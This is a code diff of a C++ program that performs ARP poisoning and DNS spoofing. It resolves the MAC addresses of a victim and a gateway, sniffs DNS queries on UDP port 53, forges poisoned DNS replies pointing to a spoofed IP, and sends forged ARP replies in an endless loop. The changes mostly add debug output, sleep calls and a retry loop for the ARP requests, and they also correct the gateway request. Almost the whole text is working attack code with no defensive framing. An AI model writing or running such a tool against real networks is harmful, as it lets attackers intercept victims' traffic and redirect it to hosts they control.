@@ -54,6 +54,7 @@ int main(int argc, const char *argv[]) {
                         victimMac[i] = arp->arp_sha[i];
                     }
                     victimMacSet = true;
+                    std::cout << "victim mac acquired" << std::endl;
                 }
 
                 if (tmp->s_addr == gatewayIp.s_addr) {
@@ -61,25 +62,38 @@ int main(int argc, const char *argv[]) {
                         gatewayMac[i] = arp->arp_sha[i];
                     }
                     gatewayMacSet = true;
+                    std::cout << "gateway mac acquired" << std::endl;
                 }
             }
         });
+    std::cout << "starting arp sniff" << std::endl;
     ipEngine.startSniff(NetworkEngine::ARP_FILTER);
-
-    // send arp request to get mac address of victim
-    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
-    ipEngine.sendArp(arpRequest);
-
-    // send arp request to get the mac address of gateway
-    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
-    ipEngine.sendArp(arpRequest);
+    std::cout << "arp sniff started" << std::endl;
 
     // stop sniffing for macs once they have been found
     while (true) {
+        if (!victimMacSet) {
+            // send arp request to get mac address of victim
+            std::cout << "requesting victim mac" << std::endl;
+            craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
+            ipEngine.sendArp(arpRequest);
+        }
+
+        if (!gatewayMacSet) {
+            // send arp request to get the mac address of gateway
+            std::cout << "requesting gateway mac" << std::endl;
+            craftArpRequest(&gatewayIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
+            ipEngine.sendArp(arpRequest);
+        }
+
         if (victimMacSet && gatewayMacSet) {
+            std::cout << "stopping arp sniff" << std::endl;
             ipEngine.stopSniff();
+            std::cout << "arp sniff has stopped" << std::endl;
             break;
         }
+
+        sleep(2);
     }
 
     // start dns sniffing
@@ -105,6 +119,8 @@ int main(int argc, const char *argv[]) {
 
             // get dns header
             dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
+
+            std::cout << "dns packet received" << std::endl;
 
             // craft the poisoned response
             int responseSize = forgeDns(dns, &spoofIp, buffer + 20 + 8);
@@ -149,12 +165,13 @@ int main(int argc, const char *argv[]) {
             sin.sin_port = udpBuffer->source;
             sin.sin_addr.s_addr = ipBuffer->daddr;
 
-            sendto(rawSocket, buffer, totalLen, 0, (struct sockaddr *)&sin,
-                   sizeof(sin));
+            sendto(rawSocket, buffer, totalLen, 0, (struct sockaddr *)&sin, sizeof(sin));
 
             close(rawSocket);
         });
+    std::cout << "starting dns sniff" << std::endl;
     ipEngine.startSniff("udp and dst port domain");
+    std::cout << "dns sniffing started" << std::endl;
 
     // start arp poisoning
     forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
@@ -163,6 +180,7 @@ int main(int argc, const char *argv[]) {
     while (true) {
         ipEngine.sendArp(victimArp);
         ipEngine.sendArp(gatewayArp);
+        sleep(5);
     }
 
     return 0;
